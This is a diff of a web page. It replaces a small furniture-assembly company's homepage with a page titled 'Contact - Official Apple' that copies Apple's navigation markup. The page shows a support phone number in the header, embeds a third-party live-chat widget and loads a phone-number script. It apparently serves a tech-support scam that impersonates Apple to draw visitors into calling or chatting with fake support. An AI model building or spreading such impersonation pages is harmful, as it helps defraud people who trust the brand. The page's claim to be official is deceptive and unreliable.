@@ -1,1435 +1,383 @@
-
-
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Sovenaezra -  Sovenaezra  Home Assembly</title>
-        <meta property="og:title" content="Sovenaezra -  Sovenaezra  Home Assembly" />
-        <meta property="og:image" content="product-images/furniture_93d7b_1.jpg"/>
-        
-        <meta property="og:description" content="About Us At Sovenaezra , we believe that every piece of furniture deserves to be assembled with precision, care, and attention to...">
-        <meta name="description" content="About Us At Sovenaezra , we believe that every piece of furniture deserves to be assembled with precision, care, and attention to...">
-  
-  
-        <link rel="shortcut icon" href="logo-icon.png" type="image/x-icon">
-        <link href='https://fonts.googleapis.com/css2?family=Arvo:ital,wght@0,400;0,700;1,400;1,700&display=swap' rel="stylesheet">
-        <link href='https://fonts.googleapis.com/css2?family=Red+Rose:wght@300..700&display=swap' rel="stylesheet">
-
-        <style>
-
-        body{
-        font-family: 'Arvo', sans-serif !important;
-        direction: ltr;
-        font-size: 15px;
-        line-height: 1.4;
-        margin: 0;
-        padding: 0;
-        overflow-x: hidden;
-        box-sizing: border-box;
-        }
-
-        :root {
-          --grey: #d9d9d9;
-          --yellow: #e8b846;
-          --grey-d: #666666;
-          --red: #e86246;
-          --blue: #25b2bf;
-          --lemon: #e6e846;
-
-          --bcg-1: #e86246;
-          --bcg-2: #25b2bf;
-          --bcg-3: #9fa125;
-
-        }
-        
-button {
-cursor: pointer;
-white-space: normal;
-width: fit-content;
-max-width: 90%;  
-white-space: normal; 
-word-break: break-word; 
-text-align: center;
-}
-      
-
-.container-margin{
-  padding: 0;
-  margin: 0 auto;
-  box-sizing: border-box;
-  }
-
-.container-padding{
- padding: 145px 25px;
-  }
-
-  img {
-max-width: 100%;
-height: auto;
-margin: auto;
-  }
-ul {
-padding-left: 0;
-padding-right: 0;
-list-style: none;
-}
-
-a {
-text-decoration: none;
-}
-
-.header-section {
-  background-color: #fff;
-  position: relative;
-  z-index: 1000;
-}
-
-.header-menu-box {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.top-header-logo {
-  display: flex;
-  align-items: center;
-}
-.privacy-section {
-  word-break: break-all;
-}
-.privacy-section li {
-  margin: 5px 18px;
-}
-.top-header-logo img,
-.bottom-logo img {
-  height: 50px;
-  margin: 12px;
-}
-.top-header-logo p{
-color: var(--grey-d);
-font-size: 28px;
-font-weight: 500;
-}
-.bottom-logo p{
-color: var(--grey);
-font-size: 28px;
-font-weight: 500;
-}
-.menu-toggle {
-  font-size: 40px;
-  background: none;
-  border: none;
-  cursor: pointer;
-  z-index: 1100;
-}
-
-.close-menu {
-  display: none;
-}
-
-.heder-menu-list {
-  position: fixed;
-  display: none;
-  flex-direction: column;
-  gap: 25px;
-  top: 0;
-  right: 0;
-  background: #fff;
-  width: 25%;
-  height: 100vh;
-  padding: 75px 0;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-  transform: translateY(-100%);
-  transition: transform 0.5s ease-in-out;
-  opacity: 0;
-}
-
-.heder-menu-list.active {
-  display: flex;
-  transform: translateY(0);
-  opacity: 1;
-}
-
-.menu-toggle.show {
-  display: block;
-}
-
-.menu-toggle.hide {
-  display: none;
-}
-
-.heder-menu-list a {
-  text-decoration: none;
-  color: var(--grey-d);
-  font-size: 37px;
-  font-weight: 500;
-  text-align: center;
-}
-
-.heder-menu-list a:hover{
-  color: var(--bcg-2); 
-}
-
-body.no-scroll {
-  overflow: hidden;
-}
-
-.head-section {
-    background: url('media/bg_2026-06-27_08-41-190.webp') no-repeat center center/cover;
-    color: white;
-    padding: 145px 25px;
-    display: flex;
-    justify-content: flex-end;
-    align-items: center;
-}
-
-.head-container {
-  display: flex;
-  justify-content: flex-end;
-  width: 100%;
-}
-
-.head-text-btn {
-    background-color: rgb(0 0 0 / 81%);
-    padding: 18px;
-    border-left: 12px solid var(--bcg-2); 
-    width: 50%;
-    animation: slideIn 1s ease-in-out;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    animation: sway 3s infinite ease-in-out;
-}
-
-@keyframes sway {
-  0% { transform: translateX(0); }
-  50% { transform: translateX(20px); }
-  100% { transform: translateX(0); }
-}
-
-.head-text-btn h1 {
-    font-size: 27px;
-    margin-bottom: 18px;
-}
-
-
-@keyframes slideIn {
-    from {
-        opacity: 0;
-        transform: translateY(50px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-.head-text-btn a{
-  margin: 25px;
-}
-.benefits-section {
-    background-color: var(--grey);
-}
-
-.benefits-list {
-    display: flex;
-    justify-content: space-around;
-    gap:  25px;
-    flex-wrap: wrap;
-}
-
-.benefit-card {
-    background-color: white;
-    padding: 28px;
-    border-radius: 35px;
-    text-align: center;
-    max-width: 379px;
-    transition: transform 0.3s ease-in-out;
-    animation: slideInFromTop 1s ease-out;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    position: relative;
-    top: -30px;
-}
-
-.benefit-card svg {
-  background-color: var(--bcg-2);
-    width: 64px;
-    height: 64px;
-    position: relative;
-    top: -50px;
-    border-radius: 50%;
-    fill: white;
-    padding: 12px;
-}
-
-.reason-text {
-    color: #666;
-    font-size: 21px;
-    font-style: italic;
-    margin: 0;
-}
-
-.benefit-card:hover {
-    transform: scale(1.1);
-}
-
-@keyframes slideInFromTop {
-    from {
-        opacity: 0;
-        transform: translateY(-50px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-.about-section {
-    background-color: var(--bcg-2); 
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-
-.about-block {
-    display: flex;
-    flex-direction: row;
-    align-items: flex-start;
-    position: relative;
-}
-
-.about-block img {
-    width: 50%;
-    height: auto;
-    object-fit: cover;
-    position: relative;
-    top: 40px;
-}
-
-.about-text {
-    background-color: white;
-    padding: 28px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    border-radius: 35px;
-    z-index: 2;
-}
-
-.about-text h2 {
-    font-size: 40px;
-    margin-bottom: 25px;
-    color: black;
-}
-
-.about-text p {
-  font-size: 21px;
-  color: var(--grey-d);
-}
-
-@keyframes fadeInUp {
-    from {
-        opacity: 0;
-        transform: translateY(50px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-.about-text {
-    animation: fadeInUp 1s ease-in-out;
-}
-
-.hero-section {
-    background-color: var(--grey); 
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.hero-container {
-  display: flex;
-  align-items: center;
-  position: relative;
-  flex-direction: column;
-}
-
-.hero-img{
-  display: flex;
-}
-.hero-img img {
-    width: 50%;
-    height: auto;
-    object-fit: cover;
-    position: relative;
-    z-index: 2; 
-}
-
-.hero-title {
-    background-color: white;
-    padding: 28px;
-    position: relative;
-    top: -30px; 
-    border-radius: 35px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    z-index: 1;
-}
-
-.hero-title h2 {
-    font-size: 40px;
-    margin-bottom: 25px;
-    color: #000;
-}
-
-.hero-text {
-  font-size: 21px;
-    color: #555; 
-}
-.hero-text li {
-  margin: 5px   18px;
-}
-.price-title{
-  font-size: 27px;
-  color: var(--bcg-2);
-}
-
-@keyframes slideInFromBottom {
-    from {
-        opacity: 0;
-        transform: translateY(50px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-.hero-title {
-    animation: slideInFromBottom 1s ease-in-out;
-}
-
-.history-section {
-  background-color: var(--grey);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-}
-
-.history-container {
-    display: flex;
-    flex-direction: column;
-}
-
-.history-title h2 {
-  font-size: 40px;
-    margin-bottom: 25px;
-    color: var(--grey-d);
-    text-align: center;
-}
-
-.history-item-fst{
-  position: relative;
-  display: flex;
-}
-.history-card-fst {
-    background-color: white;
-    padding: 28px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    border-radius: 35px;
-    width:  785px;
-    top: 500px;
-    position: absolute;
-    z-index: 1;
-}
-
-.history-card-scnd {
-    background-color: white;
-    padding: 28px;
-    display: flex;
-    align-items: center;
-    gap:  25px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    position: relative;
-    border-radius: 35px;
-}
-.history-card-fst p,
-.history-card-scnd p {
-    font-size: 21px;
-    color: #555; 
-}
-
-.history-img-top{
-  width: 379px;
-    height: 634px;
-    object-fit: cover;
-}
-
-.history-img-bott{
-  position: relative;
-    width: 634px;
-    top: 50px;
-    height: 445px;
-    object-fit: cover;
-}
-
-.history-item-scnd{
-  display: flex;
-    gap: 38px;
-    margin-top: 38px;
-}
-
-.tarif-section {
-    background-color: var(--grey-d);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.tarif-list {
-    display: flex;
-    gap: 59px;
-    justify-content: space-around;
-}
-
-.tarif-item {
-    flex: 1 1 30%;
-    background: white;
-    padding: 28px;
-    border-left: 10px solid var(--bcg-2);
-    border-radius: 35px;
-    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-    transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
-
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-
-.tarif-item:hover {
-    transform: translateY(-15px) scale(1.05);
-    box-shadow: 0px 8px 30px rgba(0, 0, 0, 0.2);
-}
-
-.tarif-item:nth-child(2) {
-    background-color: var(--bcg-2);
-    color: white;
-    transform: scale(1.1);
-}
-
-.tarif-item:nth-child(2) .price-tarif, 
-.tarif-item:nth-child(2) .name-tarif {
-    color: white;
-}
-
-.price-tarif {
-  font-size: 40px;
-  font-weight: 800;
-    margin-bottom: 23px;
-    color: #333;
-}
-
-.name-tarif {
-  font-size: 28px;
-  font-weight: 500;
-    margin-bottom: 23px;
-}
-
-.tarif-service p {
-  font-size: 22px;
-    color: var(--grey-d); 
-  
-}
-.tarif-service2 p {
-  color: #fff;
-}
-
-.gallery-wrap {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    grid-template-rows: repeat(5, 1fr);
-    gap: 10px;
-}
-
-.div1 img, .div2 img, .div3 img, .div6 img, .div7 img{
-    width: auto;
-    height: 100%;
-    object-fit: cover;
-}
-    
-.div1 {
-    grid-row: span 3 / span 3;
-}
-
-.div2 {
-    grid-row: span 2 / span 2;
-    grid-column-start: 1;
-    grid-row-start: 4;
-}
-
-.div3 {
-    grid-row: span 5 / span 5;
-    grid-column-start: 2;
-    grid-row-start: 1;
-}
-
-.div6 {
-    grid-row: span 2 / span 2;
-    grid-column-start: 3;
-    grid-row-start: 1;
-}
-
-.div7 {
-    grid-row: span 3 / span 3;
-    grid-column-start: 3;
-    grid-row-start: 3;
-}
-     
-.form-section{
-  background-color: var(--bcg-2);
-}
-.form-container{
-  display: flex;
-  justify-content: center;
-}
-.form {
-  width: 70%;
-  height: auto;
-  padding:  38px;
-  background-color: white;
-  display: flex;
-  align-items: center;
-  flex-direction: column;
-  border-radius: 35px;
-  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-}
-
-.input-btn-group__block,
-.textarea-btn-group__block {
-  margin: 18px 0;
-  padding: 23px 12px;
-  width: 70%;
-  background-color: var(--grey);
-  color:  #424242;
-  border: none;
-  outline: none;
-  transition: all 400ms;
-}
-.textarea-btn-group__block{
-  height: 126px;
-}
-.input-btn-group__block:hover,
-.textarea-btn-group__block:hover {
-  background-color: #424242;
-  color: white;
-  border: none;
-  border-radius: 35px;
-}
-.form-check{
-  padding: 18px;
-    display: flex;
-    flex-direction: row;
-    align-items: center;
-}
-.container-checkbox{
-  margin: 18px;
-}
-.form-check a,
-.check-form{
-  color: var(--grey-d);
-}
-.check {
-  cursor: pointer;
-  position: relative;
-  margin: auto;
-  width: 18px;
-  height: 18px;
-  -webkit-tap-highlight-color: transparent;
-  transform: translate3d(0, 0, 0);
-}
-
-.check:before {
-  content: "";
-  position: absolute;
-  top: -15px;
-  left: -15px;
-  width: 48px;
-  height: 48px;
-  border-radius: 50%;
-  background: rgba(34,50,84,0.03);
-  opacity: 0;
-  transition: opacity 0.2s ease;
-}
-
-.check svg {
-  position: relative;
-  z-index: 1;
-  fill: none;
-  stroke-linecap: round;
-  stroke-linejoin: round;
-  stroke: #c8ccd4;
-  stroke-width: 1.5;
-  transform: translate3d(0, 0, 0);
-  transition: all 0.2s ease;
-}
-
-.check svg path {
-  stroke-dasharray: 60;
-  stroke-dashoffset: 0;
-}
-
-.check svg polyline {
-  stroke-dasharray: 22;
-  stroke-dashoffset: 66;
-}
-
-.check:hover:before {
-  opacity: 1;
-}
-
-.check:hover svg {
-  stroke: #4285f4;
-}
-.btn-form {
-  text-align: center;
-}
-#cbx:checked + .check svg {
-  stroke: #4285f4;
-}
-
-#cbx:checked + .check svg path {
-  stroke-dashoffset: 60;
-  transition: all 0.3s linear;
-}
-
-#cbx:checked + .check svg polyline {
-  stroke-dashoffset: 42;
-  transition: all 0.2s linear;
-  transition-delay: 0.15s;
-}
-
-.footer-section{
-  background-color: var(--grey-d);
-  padding: 38px 25px;
-}
-.footer-menu{
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-
-}
-
-.footer-bottom-logo{
-  flex: 1;
-}
-.footer-menu-container{
-  display: flex;
-  flex: 2;
-  flex-wrap: wrap;
-  gap:  25px;
-  justify-content: center;
-}
-
-.footer-menu-container a{
-  text-decoration: none;
-  color: white;
-  font-size: 18px;
-  font-weight: 500;
-  text-align: center;
-}
-
-.footer-menu-container a:hover{
-  color: var(--bcg-2); 
-}
-
-.contact-section {
-  background-color: var(--bcg-2);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  flex-wrap: wrap;
-  gap:  25px;
-  position: relative;
-}
-
-.contact-container {
-  display: flex;
-  flex-direction: row;
-  justify-content: space-between;
-  align-items: center;
-  width: 100%;
-}
-
-.contact-footer {
-  background-color: #fff; 
-  flex: 1;
-  padding: 23px;
-  margin: 10px;
-  border-radius: 35px;
-  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-
-}
-
-.contact-title {
-  color: var(--grey-d); 
-  ont-size: 27px;
-  margin-bottom: 18px;
-  text-align: center;
-}
-
-.contact-list {
-  display: flex;
-  flex-direction: column;
-  gap: 18px;
-}
-
-.contact-list div {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 18px;
-  background-color: #ccc; 
-  padding: 18px;
-  border-radius: 35px;
-  transition: transform 0.3s ease-in-out;
-}
-
-.contact-list div:hover {
-  transform: translateX(10px);
-}
-
-.contact-list svg {
-  width: 50px;
-  height: 50px;
-  fill: var(--bcg-2); 
-}
-
-.contact-list a, .contact-list p {
-  font-size: 22px;
-  color: #333;
-  text-decoration: none;
-}
-
-.footer-maps {
-  margin: 10px;
-  flex: 1;
-  border-radius: 35px;
-}
-
-.container-flex {
-  display: flex;
-  flex-direction: column-reverse;
-}
-
-.bottom-logo{
-  display: flex;
-    flex-direction: row;
-    align-items: center;
-}
-
-
-
-@media screen and (min-width: 480px) {
-  .container-margin{
-    max-width: 480px;
-  }
-    }
-@media screen and (min-width: 768px) {
-  .container-margin{
-    max-width: 768px;
-  }
-    }
-@media screen and (min-width: 1200px) {
-  .container-margin{
-    max-width: 1200px;
-  }
-}
-
-@media (max-width: 1200px) {
-  .history-item-fst{
-    justify-content: center;
-  }
-  .history-img-top{
-    display: none;
-  }
-.history-card-fst{
-  width: auto;
-  position: static;
-}
-.history-img-bott{
-  margin: 12px;
-  position: static;
-}
-  .tarif-list {
-    flex-direction: column;
-  }
-}
-
-@media (max-width: 1024px) {
-  .tarif-item:nth-child(2) {
-        transform: none;
-    }
-}
-@media (max-width: 768px) {
-  .benefit-card:hover {
-    transform: none;
-  }
-  .benefit-card {
-    animation: none;
-  }
-  .heder-menu-list a {
-    font-size: 15px;
-  }
-  .head-text-btn h1{
-    font-size: 25px;
-  }
-  .heder-menu-list {
-    width: 100%;
-  }
-  .head-section {
-        justify-content: center;
-    }
-    .head-text-btn {
-        width: 90%;
-        text-align: center;
-    }
-    .hero-title h2{
-      font-size: 25px;
-    }
-    .benefits-list {
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .benefit-card {
-        width: 80%;
-    }
-    .about-block {
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .about-block img, .about-text {
-        width: 100%;
-        margin: 0;
-        padding: 12px;
-        top: 0;
-    }
-
-    .about-text {
-        text-align: center;
-    }
-
-    .hero-container {
-        flex-direction: column;
-        align-items: center;
-    }
-
-    .hero-img img{
-        width: 100%;
-
-    }
-
-    .hero-title {
-        text-align: center;
-    }
-.history-item-fst{
-  display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-    .history-card {
-        flex-direction: column;
-        align-items: flex-start;
-    }
-
-.history-item-scnd{
-  flex-direction: column;
-}
-    .tarif-list {
-        flex-direction: column;
-        gap:  25px;
-    }
-
-    .tarif-item {
-        flex: 1 1 100%;
-    }
-
-    .footer-menu{
-      flex-direction: column;
-    }
-
-    .contact-container {
-    flex-direction: column;
-    align-items: stretch;
-  }
-
-  .contact-footer, .footer-maps {
-    max-width: 100%;
-    top: 0;
-  }
-
-}
-
-    @media (max-width: 480px) {
-  .contact-title {
-    font-size: 1.5rem;
-  }
-
-  .contact-list a, .contact-list p {
-    font-size: 1rem;
-  }
-
-  .footer-maps {
-    height: 300px;
-  }
-}
-
-@media (max-width: 425px){
-  .head-text-btn h1,
-  .about-text h2,
-  .history-title h2,
-  {
-    font-size: 20px;
-  }
-  .history-card-fst,
-  .history-card-scnd{
-    padding: 12px;
-  }
-  .reason-text{
-    font-size: 18px;
-  }
-  .form{
-    width: 100%;
-    padding: 12px;
-  }
-  }
-
-    .button-1{
-  position: relative;
-  display: inline-block;
-  background: linear-gradient(to bottom, var(--yellow), rgb(71, 55, 49));
-  color: white;
-  font-family: "Segoe UI", sans-serif;
-  font-weight: 500;
-  font-size: 18px;
-  border: none;
-  padding: 12px 25px;
-  cursor: pointer;
-  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-  animation: button-shimmer 2s infinite;
-  transition: all 0.3s ease-in-out;
-}
-
-.button-1:hover {
-  background: linear-gradient(to bottom, var(--yellow), #25b2bf);
-  animation: button-particles 1s ease-in-out infinite;
-  transform: translateY(-2px);
-}
-
-.button-1:active {
-  transform: scale(0.95);
-  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-}
-
-@keyframes button-shimmer {
-  0% {
-    background-position: left top;
-  }
-
-  100% {
-    background-position: right bottom;
-  }
-}
-
-@keyframes button-particles {
-  0% {
-    background-position: left top;
-  }
-
-  100% {
-    background-position: right bottom;
-  }
-}
-
-.button-2 {
- appearance: button;
- background-color: #0f373b;
- border: solid transparent;
- border-radius: 35px;
- border-width: 0 0 4px;
- box-sizing: border-box;
- color: #FFFFFF;
- cursor: pointer;
- display: inline-block;
- font-size: 14px;
- font-weight: 500;
- letter-spacing: .8px;
- line-height: 20px;
- margin: 0;
- outline: none;
- overflow: visible;
- padding: 12px 25px;
- text-align: center;
- text-transform: uppercase;
- touch-action: manipulation;
- transform: translateZ(0);
- transition: filter .2s;
- user-select: none;
- -webkit-user-select: none;
- vertical-align: middle;
-}
-
-.button-2:after {
- background-clip: padding-box;
- background-color: #0aaebd;
- border: solid transparent;
- border-radius: 35px;
- border-width: 0 0 4px;
- bottom: -4px;
- content: "";
- left: 0;
- position: absolute;
- right: 0;
- top: 0;
- z-index: -1;
-}
-
-.button-2:main, .button-2:focus {
- user-select: auto;
-}
-
-.button-2:hover:not(:disabled) {
- filter: brightness(1.1);
-}
-
-.button-2:disabled {
- cursor: auto;
-}
-
-.button-2:active:after {
- border-width: 0 0 0px;
-}
-
-.button-2:active {
- padding-bottom: 10px;
-}
-
-.button-3 {
-  padding: 12px;
-  border: 1px solid var(--yellow);
-  border-radius: 35px;
-  transition: all 0.3s;
-  cursor: pointer;
-  background: white;
-  color: black;
-  font-size: 1.2em;
-  font-weight: 500;
-  font-family: 'Montserrat', sans-serif;
-}
-
-.button-3:hover {
-  background: var(--yellow);
-  color: white;
-  font-size: 1.5em;
-}
-
-
-.button-4{
-  width: fit-content;
-  padding: 12px;
-  font-size: 14px;
-  border-radius: 35px;
-  border: 2px solid #062e18;
-  box-shadow: 0px 0px 20px -20px;
-  cursor: pointer;
-  background-color: var(--bcg-2);
-  color: black;
-  transition: all 0.2s ease-in-out 0ms;
-  user-select: none;
-  font-family: 'Poppins', sans-serif;
-}
-
-.button-4:hover {
-  background-color: #F2F2F2;
-  box-shadow: 0px 0px 20px -18px;
-}
-
-.button-4:active {
-  transform: scale(0.95);
-}
-
-
-.button-5 {
-  width: fit-content;
- background-color: var(--grey);
- border: none;
- padding: 12px;
- font-size: 1rem;
- border-radius: 35px;
- color: #062e18;
- box-shadow: 0 0.4rem #dfd9d9;
- cursor: pointer;
-}
-
-.button-5:active {
- color: white;
- box-shadow: 0 0.2rem #dfd9d9;
- transform: translateY(0.2rem);
-}
-
-.button-5:hover:not(:disabled) {
- background: #333c37;
- color: white;
- text-shadow: 0 0.1rem #bcb4b4;
-}
-
-.button-5:disabled {
- cursor: auto;
- color: #2b2521;
-}
-
-       
-</style>
-
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-_ha6AsQGpBoFeeaNrPRvy.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
 </head>
 
 <body>
-
-
-
-<header class="header-section banner__headeruv" id="topheder">
-  <div class="header-menu-box">
-    <a href="./">
-      <div class="top-header-logo">
-        <img src="logo-icon.png">
-        <p>Sovenaezra</p>
-      </div>
-    </a>
-
-    <button class="menu-toggle open-menu" id="openMenu">&#9776;</button>
-
-
-    <nav class="heder-menu-list" id="hederMenu">
-      <button class="menu-toggle close-menu" id="closeMenu">&times;</button>
-      <a href="./">Home</a>
-      <a href="./#aboutus">About us</a>
-      
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
     </nav>
-  </div>
-</header>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-481-2417 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
